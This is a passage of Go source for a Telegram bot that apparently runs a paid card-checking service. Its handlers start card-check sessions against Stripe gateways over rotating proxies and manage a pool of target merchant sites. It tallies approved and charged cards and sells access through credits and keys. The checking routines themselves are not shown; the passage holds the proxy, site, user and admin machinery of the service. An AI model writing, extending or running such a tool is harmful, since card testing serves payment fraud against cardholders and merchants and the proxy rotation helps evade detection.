		bot.Edit(validMsg, em(emojiCheck, "\xe2\x9c\x85")+fmt.Sprintf(" %d working proxy(s). Starting check...", len(proxies)), tele.ModeHTML)

		if len(proxies) < origProxyCount {
			um.SetProxies(uid, proxies)
			um.Save()
		}

		c.Send(em(emojiLightning, "\xe2\x9c\x85")+fmt.Sprintf(" Starting check of %d cards (approved: OFF)", len(pd.Cards)), tele.ModeHTML)
		if pd.CheckFn != nil {
			sess.GatewayName = pd.GateName
			go runStripeGateSession(bot, &tele.Chat{ID: pd.ChatID}, sess, proxies, um, pd.CheckFn)
		} else {
			go runSession(bot, &tele.Chat{ID: pd.ChatID}, sess, proxies, um)
		}
		return nil
	})

	bot.Handle("/setpr", func(c tele.Context) error {
		fullText := c.Message().Text
		idx := strings.Index(fullText, "/setpr")
		if idx >= 0 {
			after := fullText[idx+len("/setpr"):]
			if len(after) > 0 && after[0] == '@' {
				if sp := strings.IndexAny(after, " \n"); sp >= 0 {
					after = after[sp:]
				} else {
					after = ""
				}
			}
			fullText = after
		}
		raw := strings.TrimSpace(fullText)

		var rawProxies []string

		if msg := c.Message(); msg != nil {
			doc := msg.Document
			if doc == nil && msg.ReplyTo != nil {
				doc = msg.ReplyTo.Document
			}
			if doc != nil && (strings.HasSuffix(strings.ToLower(doc.FileName), ".txt") || doc.MIME == "text/plain") {
				rc, err := bot.File(&doc.File)
				if err != nil {
					return c.Send(em(emojiCross, "\xe2\x9c\x85")+" Failed to download file: "+err.Error(), tele.ModeHTML)
				}
				data, err := io.ReadAll(rc)
				rc.Close()
				if err != nil {
					return c.Send(em(emojiCross, "\xe2\x9c\x85")+" Failed to read file: "+err.Error(), tele.ModeHTML)
				}

				for _, line := range strings.Split(strings.ReplaceAll(string(data), "\r\n", "\n"), "\n") {
					line = strings.TrimSpace(line)
					if line != "" && !strings.HasPrefix(line, "#") {
						rawProxies = append(rawProxies, line)
					}
				}
				if len(rawProxies) == 0 {
					return c.Send(em(emojiCross, "\xe2\x9c\x85")+" No proxies found in file", tele.ModeHTML)
				}
				raw = strings.Join(rawProxies, "\n")
			}
		}

		if raw == "" {
			return c.Send("Usage: /setpr proxy1\\nproxy2\\nproxy3\\n...\nOr reply to a .txt file with /setpr")
		}

		if len(rawProxies) == 0 {
			for _, line := range strings.Split(raw, "\n") {
				line = strings.TrimSpace(line)
				if line != "" {
					rawProxies = append(rawProxies, line)
				}
			}
		}
		if len(rawProxies) == 0 {
			return c.Send("O No proxies provided")
		}

		uid := c.Sender().ID
		existingProxies := um.GetProxies(uid)

		type proxyEntry struct {
			normalized string
			valid      bool
		}
		var toTest []proxyEntry
		dupes := 0
		parseFail := 0
		existing := make(map[string]bool)
		for _, p := range existingProxies {
			existing[p] = true
		}
		for _, rp := range rawProxies {
			normalized, err := normalizeProxy(rp)
			if err != nil {
				parseFail++
				continue
			}
			if _, err := url.Parse(normalized); err != nil {
				parseFail++
				continue
			}
			if existing[normalized] {
				dupes++
				continue
			}
			existing[normalized] = true
			toTest = append(toTest, proxyEntry{normalized: normalized})
		}

		if len(toTest) == 0 {
			msg := em(emojiCross, "\xe2\x9c\x85") + " No new proxies to test"
			if parseFail > 0 {
				msg += fmt.Sprintf(" (%d invalid)", parseFail)
			}
			if dupes > 0 {
				msg += fmt.Sprintf(" (%d duplicate)", dupes)
			}
			return c.Send(msg, tele.ModeHTML)
		}

		c.Send(em(emojiSearch, "\xe2\x9c\x85")+fmt.Sprintf(" Testing %d proxy(s)...", len(toTest)), tele.ModeHTML)

		var wg sync.WaitGroup
		results := make([]bool, len(toTest))
		for i := range toTest {
			wg.Add(1)
			go func(idx int) {
				defer wg.Done()
				if err := testProxy(toTest[idx].normalized); err == nil {
					results[idx] = true
				}
			}(i)
		}
		wg.Wait()

		added := 0
		failed := 0
		for i, ok := range results {
			if ok {
				um.AddProxy(uid, toTest[i].normalized)
				added++
			} else {
				failed++
			}
		}
		failed += parseFail

		um.Save()

		totalProxies := len(um.GetProxies(uid))
		msg := em(emojiCheck, "\xe2\x9c\x85") + fmt.Sprintf(" %d proxy(s) added (%d total)", added, totalProxies)
		if failed > 0 {
			msg += fmt.Sprintf("\n"+em(emojiCross, "\xe2\x9c\x85")+" %d failed", failed)
		}
		if dupes > 0 {
			msg += fmt.Sprintf("\n"+em(emojiLightning, "\xe2\x9c\x85")+" %d duplicate(s) skipped", dupes)
		}
		return c.Send(msg, tele.ModeHTML)
	})

	bot.Handle("/rmpr", func(c tele.Context) error {
		raw := strings.TrimSpace(c.Message().Payload)
		if raw == "" {
			return c.Send("Usage: /rmpr &lt;proxy&gt; or /rmpr all")
		}

		uid := c.Sender().ID
		if strings.ToLower(raw) == "all" {
			um.SetProxies(uid, nil)
			um.Save()
			return c.Send(em(emojiCheck, "\xe2\x9c\x85")+" All proxies removed", tele.ModeHTML)
		}

		normalized, err := normalizeProxy(raw)
		if err != nil {
			return c.Send(em(emojiCross, "\xe2\x9c\x85")+" Invalid proxy format: "+err.Error(), tele.ModeHTML)
		}
		currentProxies := um.GetProxies(uid)
		found := false
		newList := make([]string, 0, len(currentProxies))
		for _, p := range currentProxies {
			if p == normalized {
				found = true
				continue
			}
			newList = append(newList, p)
		}
		if !found {
			return c.Send(em(emojiCross, "\xe2\x9c\x85")+" Proxy not found in your list", tele.ModeHTML)
		}
		um.SetProxies(uid, newList)
		um.Save()
		return c.Send(em(emojiCheck, "\xe2\x9c\x85")+fmt.Sprintf(" Proxy removed (%d remaining)", len(newList)), tele.ModeHTML)
	})

bot.Handle("/stop", func(c tele.Context) error {
		uid := c.Sender().ID
		val, ok := activeSessions.Load(uid)
		if !ok {
			return c.Send(em(emojiWarn, "\xe2\x9c\x85")+" No active session to stop.", tele.ModeHTML)
		}
		sess := val.(*CheckSession)
		sess.Cancelled.Store(true)
		if sess.Cancel != nil {
			sess.Cancel()
		}
		done := sess.Done
		go func() {
			select {
			case <-done:
			case <-time.After(10 * time.Second):
			}
		}()
		c.Send(em(emojiCross, "\xe2\x9c\x85")+fmt.Sprintf(" Stopping session... (%d/%d done)", sess.Checked.Load(), sess.Total), tele.ModeHTML)
		return nil
	})

	bot.Handle("/stopall", func(c tele.Context) error {
		if !isAdmin(c.Sender().ID) {
			return c.Send(em(emojiCross, "\xe2\x9c\x85")+" Only admin can use /stopall", tele.ModeHTML)
		}
		count := 0
		activeSessions.Range(func(key, val any) bool {
			sess := val.(*CheckSession)
			sess.Cancelled.Store(true)
			if sess.Cancel != nil {
				sess.Cancel()
			}
			unregisterSession(sess)
			count++
			return true
		})
		if count == 0 {
			return c.Send(em(emojiWarn, "\xe2\x9c\x85")+" No active sessions.", tele.ModeHTML)
		}
		return c.Send(em(emojiCross, "\xe2\x9c\x85")+fmt.Sprintf(" Stopping %d session(s)...", count), tele.ModeHTML)
	})

	bot.Handle("/ban", func(c tele.Context) error {
		if !isAdmin(c.Sender().ID) {
			return c.Send(em(emojiCross, "\xe2\x9c\x85")+" Only admin can use /ban", tele.ModeHTML)
		}
		raw := strings.TrimSpace(c.Message().Payload)
		if raw == "" {
			return c.Send("Usage: /ban &lt;userid&gt;")
		}
		uid, err := strconv.ParseInt(raw, 10, 64)
		if err != nil {
			return c.Send(em(emojiCross, "\xe2\x9c\x85")+" Invalid user ID", tele.ModeHTML)
		}
	if isAdmin(uid) {
		return c.Send(em(emojiCross, "\xe2\x9c\x85")+" Cannot ban admin", tele.ModeHTML)
	}
	cfg.mu.Lock()
	cfg.BannedUsers[uid] = true
	cfg.mu.Unlock()
	cfg.Save()
	stopped := stopAllUserSessions(uid)
	if stopped > 0 {
		c.Send(fmt.Sprintf("Stopped %d active session(s) for user %d.", stopped, uid))
	}
	return c.Send(em(emojiCheck, "\xe2\x9c\x85")+fmt.Sprintf(" User %d banned.", uid), tele.ModeHTML)
	})

	bot.Handle("/unban", func(c tele.Context) error {
		if !isAdmin(c.Sender().ID) {
			return c.Send(em(emojiCross, "\xe2\x9c\x85")+" Only admin can use /unban", tele.ModeHTML)
		}
		raw := strings.TrimSpace(c.Message().Payload)
		if raw == "" {
			return c.Send("Usage: /unban &lt;userid&gt;")
		}
		uid, err := strconv.ParseInt(raw, 10, 64)
		if err != nil {
			return c.Send(em(emojiCross, "\xe2\x9c\x85")+" Invalid user ID", tele.ModeHTML)
		}
		cfg.mu.Lock()
		delete(cfg.BannedUsers, uid)
		cfg.mu.Unlock()
		cfg.Save()
		return c.Send(em(emojiCheck, "\xe2\x9c\x85")+fmt.Sprintf(" User %d unbanned.", uid), tele.ModeHTML)
	})

	bot.Handle("/pvtonly", func(c tele.Context) error {
		if !isAdmin(c.Sender().ID) {
			return c.Send(em(emojiCross, "\xe2\x9c\x85")+" Only admin can use /pvtonly", tele.ModeHTML)
		}
		cfg.mu.Lock()
		cfg.PvtOnly = !cfg.PvtOnly
		state := cfg.PvtOnly
		cfg.mu.Unlock()
		cfg.Save()
		if state {
			return c.Send(em(emojiCross, "\xe2\x9c\x85")+" Private mode ON -> only allowed users can use the bot.", tele.ModeHTML)
		}
		return c.Send(em(emojiCheck, "\xe2\x9c\x85")+" Private mode OFF -> everyone can use the bot.", tele.ModeHTML)
	})

	bot.Handle("/allowuser", func(c tele.Context) error {
		if !isAdmin(c.Sender().ID) {
			return c.Send(em(emojiCross, "\xe2\x9c\x85")+" Only admin can use /allowuser", tele.ModeHTML)
		}
		raw := strings.TrimSpace(c.Message().Payload)
		if raw == "" {
			return c.Send("Usage: /allowuser &lt;userid&gt;")
		}
		uid, err := strconv.ParseInt(raw, 10, 64)
		if err != nil {
			return c.Send(em(emojiCross, "\xe2\x9c\x85")+" Invalid user ID", tele.ModeHTML)
		}
		cfg.mu.Lock()
		cfg.AllowedUsers[uid] = true
		cfg.mu.Unlock()
		cfg.Save()
		return c.Send(em(emojiCheck, "\xe2\x9c\x85")+fmt.Sprintf(" User %d allowed.", uid), tele.ModeHTML)
	})

	bot.Handle("/removeuser", func(c tele.Context) error {
		if !isAdmin(c.Sender().ID) {
			return c.Send(em(emojiCross, "\xe2\x9c\x85")+" Only admin can use /removeuser", tele.ModeHTML)
		}
		raw := strings.TrimSpace(c.Message().Payload)
		if raw == "" {
			return c.Send("Usage: /removeuser &lt;userid&gt;")
		}
		uid, err := strconv.ParseInt(raw, 10, 64)
		if err != nil {
			return c.Send(em(emojiCross, "\xe2\x9c\x85")+" Invalid user ID", tele.ModeHTML)
		}
		cfg.mu.Lock()
		delete(cfg.AllowedUsers, uid)
		cfg.mu.Unlock()
		cfg.Save()
		return c.Send(em(emojiCheck, "\xe2\x9c\x85")+fmt.Sprintf(" User %d removed from allowed list.", uid), tele.ModeHTML)
	})

	bot.Handle("/split", func(c tele.Context) error {
		raw := strings.TrimSpace(c.Message().Payload)
		if raw == "" {
			return c.Send("Usage: reply to a .txt file with /split &lt;N&gt;")
		}
		n, err := strconv.Atoi(raw)
		if err != nil || n < 2 {
			return c.Send("O Provide a number >= 2")
		}

		msg := c.Message()
		var doc *tele.Document
		if msg.Document != nil {
			doc = msg.Document
		} else if msg.ReplyTo != nil && msg.ReplyTo.Document != nil {
			doc = msg.ReplyTo.Document
		}
		if doc == nil {
			return c.Send("O Reply to a .txt file with /split &lt;N&gt; or attach a .txt file with /split as caption")
		}

		rc, err := bot.File(&doc.File)
		if err != nil {
			return c.Send("O Failed to download file: " + err.Error())
		}
		defer rc.Close()
		data, err := io.ReadAll(rc)
		if err != nil {
			return c.Send("O Failed to read file: " + err.Error())
		}


		var lines []string
		for _, line := range strings.Split(string(data), "\n") {
			line = strings.TrimSpace(line)
			if line != "" {
				lines = append(lines, line)
			}
		}
		if len(lines) == 0 {
			return c.Send("O File is empty")
		}
		if n > len(lines) {
			n = len(lines)
		}

		chunkSize := len(lines) / n
		extra := len(lines) % n
		start := 0
		for i := 0; i < n; i++ {
			end := start + chunkSize
			if i < extra {
				end++
			}
			chunk := lines[start:end]
			start = end

			buf := bytes.NewBufferString(strings.Join(chunk, "\n"))
			fname := fmt.Sprintf("part_%d_of_%d.txt", i+1, n)
			doc := &tele.Document{
				File:     tele.FromReader(buf),
				FileName: fname,
				Caption:  fmt.Sprintf("Part %d/%d (%d lines)", i+1, n, len(chunk)),
			}
			bot.Send(c.Chat(), doc)
		}
		return nil
	})

	bot.Handle("/addsite", func(c tele.Context) error {
		if !isAdmin(c.Sender().ID) {
			return c.Send("O Only admin can use /addsite")
		}

		var raw string
		msg := c.Message()

		var doc *tele.Document
		if msg.Document != nil {
			doc = msg.Document
		} else if msg.ReplyTo != nil && msg.ReplyTo.Document != nil {
			doc = msg.ReplyTo.Document
		}
		if doc != nil {
			rc, err := bot.File(&doc.File)
			if err != nil {
				return c.Send("O Failed to download file: " + err.Error())
			}
			defer rc.Close()
data, err := io.ReadAll(rc)
		if err != nil {
			return c.Send("O Failed to read file: " + err.Error())
		}

		raw = string(data)
		} else {
			fullText := msg.Text
			idx := strings.Index(fullText, "/addsite")
			if idx >= 0 {
				after := fullText[idx+len("/addsite"):]
				if len(after) > 0 && after[0] == '@' {
					if sp := strings.IndexAny(after, " \n"); sp >= 0 {
						after = after[sp:]
					} else {
						after = ""
					}
				}
				raw = after
			}
		}

		raw = strings.TrimSpace(raw)
		if raw == "" {
			return c.Send("Usage: /addsite site1\nsite2\nsite3\n\nOr reply to a .txt file with /addsite")
		}

		added := 0
		dupes := 0
		customSitesMu.Lock()
		existing := make(map[string]bool, len(customSites))
		for _, s := range customSites {
			existing[s] = true
		}
		for _, line := range strings.Split(raw, "\n") {
			site := strings.TrimSpace(line)
			if site == "" {
				continue
			}
			site = strings.TrimRight(site, "/")
			if !strings.HasPrefix(site, "http") {
				site = "https://" + site
			}
			if existing[site] {
				dupes++
				continue
			}
			customSites = append(customSites, site)
			existing[site] = true
			added++
		}
		total := len(customSites)
		customSitesMu.Unlock()
		saveCustomSites()

		msgText := fmt.Sprintf("o. Added %d site(s) (%d total custom sites)", added, total)
		if dupes > 0 {
			msgText += fmt.Sprintf("\n %d duplicate(s) skipped", dupes)
		}
		return c.Send(msgText)
	})

	bot.Handle("/rmsite", func(c tele.Context) error {
		if !isAdmin(c.Sender().ID) {
			return c.Send("O Only admin can use /rmsite")
		}
		raw := strings.TrimSpace(c.Message().Payload)
		if raw == "" {
			return c.Send("Usage: /rmsite &lt;site&gt; or /rmsite all")
		}
		if strings.ToLower(raw) == "all" {
			customSitesMu.Lock()
			customSites = nil
			customSitesMu.Unlock()
			saveCustomSites()
			return c.Send("o. All custom sites removed. Bot will use API sites.")
		}
		site := strings.TrimRight(strings.TrimSpace(raw), "/")
		if !strings.HasPrefix(site, "http") {
			site = "https://" + site
		}
		customSitesMu.Lock()
		found := false
		newList := make([]string, 0, len(customSites))
		for _, s := range customSites {
			if s == site {
				found = true
				continue
			}
			newList = append(newList, s)
		}
		customSites = newList
		remaining := len(customSites)
		customSitesMu.Unlock()
		if !found {
			return c.Send("O Site not found in custom list")
		}
		saveCustomSites()
		if remaining == 0 {
			return c.Send("Site removed. No custom sites left -> bot will use API sites.")
		}
		return c.Send(fmt.Sprintf("o. Site removed (%d remaining)", remaining))
	})

	bot.Handle("/site", func(c tele.Context) error {
		if !isAdmin(c.Sender().ID) {
			return c.Send("O Only admin can use /site")
		}
		keyword := strings.TrimSpace(c.Message().Payload)
		if keyword == "" {
			return c.Send("Usage: /site &lt;keyword&gt;  or  /site all")
		}

		allSites := make(map[string]bool)
		for _, s := range getCustomSites() {
			allSites[s] = true
		}
		sitePoolMu.RLock()
		for _, s := range sitePool {
			allSites[s] = true
		}
		sitePoolMu.RUnlock()

		if strings.ToLower(keyword) == "all" {
			if len(allSites) == 0 {
				return c.Send("No sites available.")
			}
			var list []string
			for s := range allSites {
				list = append(list, s)
			}
			sort.Strings(list)
			buf := bytes.NewBufferString(strings.Join(list, "\n"))
			doc := &tele.Document{
				File:     tele.FromReader(buf),
				FileName: "sites.txt",
				Caption:  fmt.Sprintf("YO All sites (%d)", len(list)),
			}
			return c.Send(doc)
		}

		kw := strings.ToLower(keyword)
		var matches []string
		for s := range allSites {
			if strings.Contains(strings.ToLower(s), kw) {
				matches = append(matches, s)
			}
		}
		sort.Strings(matches)

		if len(matches) == 0 {
			return c.Send(fmt.Sprintf("No sites found containing \"%s\"", keyword))
		}
		var sb strings.Builder
		sb.WriteString(fmt.Sprintf("Sites matching \"%s\" (%d):\n\n", keyword, len(matches)))
		for i, s := range matches {
			sb.WriteString(fmt.Sprintf("%d. %s\n", i+1, s))
		}
		return c.Send(sb.String())
	})

	bot.Handle("/stats", func(c tele.Context) error {
		return c.Send(formatStatsMsg(um), tele.ModeHTML)
	})

	bot.Handle("/active", func(c tele.Context) error {
		if !isAdmin(c.Sender().ID) {
			return c.Send(em(emojiCross, "\xe2\x9c\x85")+" Admin only.", tele.ModeHTML)
		}
		return c.Send(formatActiveMsg(), tele.ModeHTML)
	})

bot.Handle("/admin", func(c tele.Context) error {
		if !isAdmin(c.Sender().ID) {
			return c.Send(" Admin only.", tele.ModeHTML)
		}
		return c.Send(
			em("5217822164362739968", "\xe2\x9c\x85") + " <b>Admin Panel</b> " + em("5217822164362739968", "\xe2\x9c\x85") + "\n" +
				"??????????????????????\n\n" +
				em("5877395722164247324", "\xe2\x9c\x85") + " <b>User Management</b>\n" +
				"-> " + em("5352585602317426381", "\xe2\x9c\x85") + " /ban &lt;id&gt;        - Ban a user\n" +
				"-> " + em("5206607081334906820", "\xe2\x9c\x85") + " /unban &lt;id&gt;      - Unban a user\n" +
				"-> " + em("5296369303661067030", "\xe2\x9c\x85") + " /allowuser &lt;id&gt;  - Allow a user\n" +
				"-> " + em("5039614900280754969", "\xe2\x9c\x85") + " /removeuser &lt;id&gt; - Revoke access\n\n" +
				em("5042328396193864923", "\xe2\x9c\x85") + " <b>Bot Control</b>\n" +
				"-> " + em("5447644880824181073", "\xe2\x9c\x85") + " /pvtonly  - Toggle private mode\n" +
				"-> " + em("5039778134807806727", "\xe2\x9c\x85") + " /free     - Toggle free mode\n" +
				"-> " + em("5039671744172917707", "\xe2\x9c\x85") + " /stop     - Stop own session\n" +
				"-> " + em("5042334757040423886", "\xe2\x9c\x85") + " /stopall  - Stop all sessions\n\n" +
				em("5409048419211682843", "\xe2\x9c\x85") + " <b>Credit System</b>\n" +
				"-> " + em("5041975203853239332", "\xe2\x9c\x85") + " /genkey &lt;credits|unlimited&gt; &lt;dur&gt; - Generate a key\n" +
				"-> " + em("5296369303661067030", "\xe2\x9c\x85") + " /keys  - List active keys\n" +
				"-> " + em("5042290883949495533", "\xe2\x9c\x85") + " /allkeys  - List all keys (history)\n" +
				"-> " + em("5039614900280754969", "\xe2\x9c\x85") + " /deactivate &lt;key&gt;  - Deactivate one key\n" +
				"-> " + em("5039614900280754969", "\xe2\x9c\x85") + " /deactivateall  - Deactivate all keys\n" +
				"-> " + em("5039614900280754969", "\xe2\x9c\x85") + " /delkey &lt;key&gt;  - Delete one key\n" +
				"-> " + em("5039614900280754969", "\xe2\x9c\x85") + " /delallkeys  - Delete all keys\n" +
				"-> " + em("5409048419211682843", "\xe2\x9c\x85") + " /editfreelimit &lt;amount&gt;  - Change daily limit\n" +
				"-> " + em("5999317873623831250", "\xe2\x9c\x85") + " /addcredit &lt;@u|id&gt; &lt;amt&gt;  - Add credits\n" +
				"-> " + em("5039891861246838069", "\xe2\x9c\x85") + " /removecredit &lt;@u|id&gt; &lt;amt&gt;  - Remove credits\n" +
				"-> " + em("5039891861246838069", "\xe2\x9c\x85") + " /checkcredit &lt;@u|id&gt;  - View user balance\n\n" +
				em("5039614900280754969", "\xe2\x9c\x85") + " <b>Site Management</b>\n" +
				"-> " + em("5352585602317426381", "\xe2\x9c\x85") + " /addsite &lt;url&gt;  - Add site\n" +
				"-> " + em("5039649904264217620", "\xe2\x9c\x85") + " /rmsite &lt;url&gt;   - Remove site\n" +
				"-> " + em("5447644880824181073", "\xe2\x9c\x85") + " /scrsites       - Download pool\n" +
				"-> " + em("5298970748172385213", "\xe2\x9c\x85") + " /site &lt;keyword&gt; - Search sites\n\n" +
				em("5039623284056917259", "\xe2\x9c\x85") + " <b>Info</b>\n" +
				"-> " + em("4936468614967460670", "\xe2\x9c\x85") + " /stats  - Global stats\n" +
				"-> " + em("4936468614967460670", "\xe2\x9c\x85") + " /active - Live sessions\n\n" +
				em("4936468614967460670", "\xe2\x9c\x85") + " <b>Broadcast</b>\n" +
				"-> " + em("5427168083074628963", "\xe2\x9c\x85") + " /broadcast &lt;msg&gt;        - Broadcast to all\n" +
				"-> " + em("5040030395416969985", "\xe2\x9c\x85") + " /pvtbroadcast &lt;id&gt; &lt;msg&gt; - Broadcast to one user\n\n" +
				em("5877395722164247324", "\xe2\x9c\x85") + " <b>Data & Proxies</b>\n" +
				"-> " + em("5039614900280754969", "\xe2\x9c\x85") + " /show &lt;id&gt;           - Show proxies\n" +
				"-> " + em("5039614900280754969", "\xe2\x9c\x85") + " /cleanproxies        - Clean proxies\n" +
				"-> " + em("5039614900280754969", "\xe2\x9c\x85") + " /chkpr &lt;id&gt;          - Test proxies\n" +
				"-> " + em("5039614900280754969", "\xe2\x9c\x85") + " /admins              - List admins\n" +
				"-> " + em("5039614900280754969", "\xe2\x9c\x85") + " /addadmin &lt;id&gt;       - Add admin\n" +
				"-> " + em("5039614900280754969", "\xe2\x9c\x85") + " /rmadmin &lt;id&gt;        - Remove admin\n" +
				"-> " + em("5039614900280754969", "\xe2\x9c\x85") + " /giveperm &lt;id&gt; &lt;cmd&gt; - Grant permission\n" +
				"-> " + em("5039614900280754969", "\xe2\x9c\x85") + " /reboot              - Reboot bot\n\n" +
				"??????????????????????\n" +
				em("5877395722164247324", "\xe2\x9c\x85") + " Powered by @SORRY_00001",
		tele.ModeHTML)
	})

	bot.Handle("/broadcast", func(c tele.Context) error {
		if !isAdmin(c.Sender().ID) {
			return c.Send(" Admin only.")
		}
		fullText := c.Message().Text
		idx := strings.Index(fullText, " ")
		if idx < 0 || strings.TrimSpace(fullText[idx:]) == "" {
			return c.Send("Usage: /broadcast &lt;message&gt;")
		}
		msg := strings.TrimSpace(fullText[idx:])
		ids := um.AllIDs()
		sent, failed := 0, 0
		for _, uid := range ids {
			_, err := bot.Send(tele.ChatID(uid), " "+msg, tele.ModeHTML)
			if err != nil {
				failed++
			} else {
				sent++
			}
		}
		return c.Send(fmt.Sprintf(" Broadcast complete\n Sent: %d\n Failed: %d", sent, failed))
	})

	bot.Handle("/broadcastuser", func(c tele.Context) error {
		if !isAdmin(c.Sender().ID) {
			return c.Send(" Admin only.")
		}
		parts := strings.SplitN(strings.TrimSpace(c.Message().Payload), " ", 2)
		if len(parts) < 2 || strings.TrimSpace(parts[1]) == "" {
			return c.Send("Usage: /broadcastuser &lt;user_id&gt; &lt;message&gt;")
		}
		uid, err := strconv.ParseInt(strings.TrimSpace(parts[0]), 10, 64)
		if err != nil {
			return c.Send(" Invalid user ID.")
		}
		msg := strings.TrimSpace(parts[1])
		_, err = bot.Send(tele.ChatID(uid), " "+msg, tele.ModeHTML)
		if err != nil {
			return c.Send(fmt.Sprintf(" Failed to send: %v", err))
		}
		return c.Send(fmt.Sprintf(" Message sent to %d.", uid))
	})

	bot.Handle("/broadcastactive", func(c tele.Context) error {
		if !isAdmin(c.Sender().ID) {
			return c.Send(" Admin only.")
		}
		msg := strings.TrimSpace(c.Message().Payload)
		if msg == "" {
			return c.Send("Usage: /broadcastactive &lt;message&gt;")
		}
		sent, failed := 0, 0
		activeSessions.Range(func(key, val any) bool {
			sess := val.(*CheckSession)
			_, err := bot.Send(tele.ChatID(sess.UserID), " "+msg, tele.ModeHTML)
			if err != nil {
				failed++
			} else {
				sent++
			}
			return true
		})
		return c.Send(fmt.Sprintf(" Active broadcast\n Sent: %d\n Failed: %d", sent, failed))
	})

	bot.Handle("/me", func(c tele.Context) error {
		uid := c.Sender().ID
		ud := um.Get(uid)
		um.SetUsername(uid, c.Sender().Username)
		um.mu.RLock()
		s := ud.Stats
		credits := ud.Credits
		um.mu.RUnlock()
		dailyCount := um.GetDailyCount(uid)
		limit := currentDailyLimit()
		remaining := limit - dailyCount
		if remaining < 0 {
			remaining = 0
		}
		approvedRate, chargedRate := 0.0, 0.0
		if s.TotalChecked > 0 {
			approvedRate = float64(s.TotalApproved) * 100.0 / float64(s.TotalChecked)
			chargedRate = float64(s.TotalCharged) * 100.0 / float64(s.TotalChecked)
		}
		unlimited := ""
		if um.HasUnlimited(uid) {
			unlimited = "\n Unlimited: active"
		}
		return c.Send(fmt.Sprintf(
			"━━━━━━━━━━━━━━━━━━━━━━━━\n" +
				"  𝗠𝘆 𝗣𝗿𝗼𝗳𝗶𝗹𝗲\n" +
				"━━━━━━━━━━━━━━━━━━━━━━━━\n\n" +
				"  Credits: %s\n" +
				"  Daily: %d / %d (remaining: %d)%s\n\n" +
				"──────────────────────────\n" +
				"  Total Checked  :  %6d  \n" +
				"  Approved       :  %6d  \n" +
				"  Declined       :  %6d  \n" +
				"  Charged        :  %6d  \n" +
				"──────────────────────────\n\n" +
				"  Total Charged Amount: $%.2f\n" +
				"  Approved: %.1f%%  Charged: %.1f%%\n" +
				"━━━━━━━━━━━━━━━━━━━━━━━━",
		strconvFloat(credits), dailyCount, limit, remaining, unlimited,
			s.TotalChecked, s.TotalApproved, s.TotalDeclined, s.TotalCharged,
			s.TotalChargedAmt, approvedRate, chargedRate), tele.ModeHTML)
	})

	bot.Handle("/resetstats", func(c tele.Context) error {
		if !isAdmin(c.Sender().ID) {
			return c.Send(" Admin only.")
		}
		um.mu.Lock()
		for _, ud := range um.users {
			ud.Stats = UserStats{}
		}
		um.mu.Unlock()
		um.Save()
		return c.Send(" All stats have been reset.")
	})

	bot.Handle("/restrict", func(c tele.Context) error {
		if !isAdmin(c.Sender().ID) {
			return c.Send(" Admin only.")
		}
		arg := strings.TrimSpace(c.Message().Payload)
		if arg == "" {
			return c.Send("Usage: /restrict all  or  /restrict &lt;id1,id2,...&gt;")
		}
	if strings.ToLower(arg) == "all" {
		cfg.mu.Lock()
		cfg.RestrictAll = true
		cfg.mu.Unlock()
		cfg.Save()
		return c.Send(" Bot restricted - only explicitly allowed users can access.")
	}
	var restrictedIDs []int64
	cfg.mu.Lock()
	for _, tok := range strings.Split(arg, ",") {
		uid, err := strconv.ParseInt(strings.TrimSpace(tok), 10, 64)
		if err != nil {
			continue
		}
		found := false
		for _, b := range cfg.BlockedIDs {
			if b == uid {
				found = true
				break
			}
		}
		if !found {
			cfg.BlockedIDs = append(cfg.BlockedIDs, uid)
		}
		restrictedIDs = append(restrictedIDs, uid)
	}
	blockedCopy := make([]int64, len(cfg.BlockedIDs))
	copy(blockedCopy, cfg.BlockedIDs)
	cfg.mu.Unlock()
	cfg.Save()
	for _, rid := range restrictedIDs {
		stopAllUserSessions(rid)
	}
	return c.Send(fmt.Sprintf(" Restricted IDs updated: %v", blockedCopy))
	})

	bot.Handle("/allowonly", func(c tele.Context) error {
		if !isAdmin(c.Sender().ID) {
			return c.Send(" Admin only.")
		}
		arg := strings.TrimSpace(c.Message().Payload)
		if arg == "" {
			return c.Send("Usage: /allowonly &lt;id1,id2,...&gt;")
		}
		var ids []int64
		for _, tok := range strings.Split(arg, ",") {
			uid, err := strconv.ParseInt(strings.TrimSpace(tok), 10, 64)
			if err != nil {
				continue
			}
			ids = append(ids, uid)
		}
		if len(ids) == 0 {
			return c.Send(" No valid IDs found.")
		}
		cfg.mu.Lock()
		cfg.AllowOnlyIDs = ids
		cfg.RestrictAll = true
		cfg.mu.Unlock()
		cfg.Save()
		return c.Send(fmt.Sprintf(" Allow-only mode enabled for: %v", ids))
	})

	bot.Handle("/unrestrict", func(c tele.Context) error {
		if !isAdmin(c.Sender().ID) {
			return c.Send(" Admin only.")
		}
		arg := strings.TrimSpace(c.Message().Payload)
		if arg == "" {
			return c.Send("Usage: /unrestrict all  or  /unrestrict &lt;id1,id2,...&gt;")
		}
		if strings.ToLower(arg) == "all" {
			cfg.mu.Lock()
			cfg.RestrictAll = false
			cfg.BlockedIDs = nil
			cfg.AllowOnlyIDs = nil
			cfg.mu.Unlock()
			cfg.Save()
			return c.Send(" All restrictions cleared.")
		}
	cfg.mu.Lock()
	for _, tok := range strings.Split(arg, ",") {
		uid, err := strconv.ParseInt(strings.TrimSpace(tok), 10, 64)
		if err != nil {
			continue
		}
		newList := cfg.BlockedIDs[:0]
		for _, b := range cfg.BlockedIDs {
			if b != uid {
				newList = append(newList, b)
			}
		}
		cfg.BlockedIDs = newList
	}
	blockedCopy := make([]int64, len(cfg.BlockedIDs))
	copy(blockedCopy, cfg.BlockedIDs)
	cfg.mu.Unlock()
	cfg.Save()
	return c.Send(fmt.Sprintf(" Blocked IDs updated: %v", blockedCopy))
	})

	bot.Handle("/admins", func(c tele.Context) error {
		if !isAdmin(c.Sender().ID) {
			return c.Send(" Admin only.")
		}
		var sb strings.Builder
		sb.WriteString(" Admins:\n")
		for id := range adminIDs {
			sb.WriteString(fmt.Sprintf(". %d (hardcoded)\n", id))
		}
		cfg.mu.RLock()
		for _, id := range cfg.DynamicAdmins {
			if !adminIDs[id] {
				sb.WriteString(fmt.Sprintf(". %d\n", id))
			}
		}
		cfg.mu.RUnlock()
		return c.Send(sb.String())
	})

	bot.Handle("/addadmin", func(c tele.Context) error {
		if !isAdmin(c.Sender().ID) {
			return c.Send(" Admin only.")
		}
		raw := strings.TrimSpace(c.Message().Payload)
		if raw == "" {
			return c.Send("Usage: /addadmin &lt;user_id&gt;")
		}
		uid, err := strconv.ParseInt(raw, 10, 64)
		if err != nil {
			return c.Send(" Invalid user ID.")
		}
		cfg.mu.Lock()
		found := false
		for _, a := range cfg.DynamicAdmins {
			if a == uid {
				found = true
				break
			}
		}
		if !found {
